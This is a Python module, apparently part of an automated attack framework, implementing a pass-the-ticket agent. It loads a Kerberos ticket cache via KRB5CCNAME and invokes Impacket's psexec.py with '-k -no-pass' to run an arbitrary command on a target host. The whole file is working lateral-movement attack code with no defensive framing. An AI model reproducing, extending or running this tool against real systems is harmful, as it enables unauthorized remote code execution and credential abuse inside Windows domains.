"""Pass-the-Ticket Agent - Use Kerberos tickets for authentication"""
import asyncio, os, logging
from typing import Dict, Any
from core.base_agent import BaseAgent
from core.agent_data import AgentData

log = logging.getLogger(__name__)

class PassTheTicketAgent(BaseAgent):
    def __init__(self):
        super().__init__(name="PassTheTicketAgent", description="Use Kerberos tickets for authentication", version="1.0.0")
    
    async def run(self, strategy: Dict[str, Any]) -> AgentData:
        try:
            ticket_file = strategy.get('ticket_file')
            target = strategy.get('target')
            command = strategy.get('command', 'whoami')
            
            if not ticket_file or not os.path.exists(ticket_file):
                return AgentData(success=False, errors=["Ticket file not found"])
            
            # Set KRB5CCNAME environment variable
            os.environ['KRB5CCNAME'] = ticket_file
            
            # Use ticket with Impacket tools
            cmd = ['psexec.py', '-k', '-no-pass', target, command] if target else ['klist']
            
            process = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await process.communicate()
            
            return AgentData(success=process.returncode == 0, data={'output': stdout.decode(), 'ticket_file': ticket_file})
        except Exception as e:
            return AgentData(success=False, errors=[str(e)])
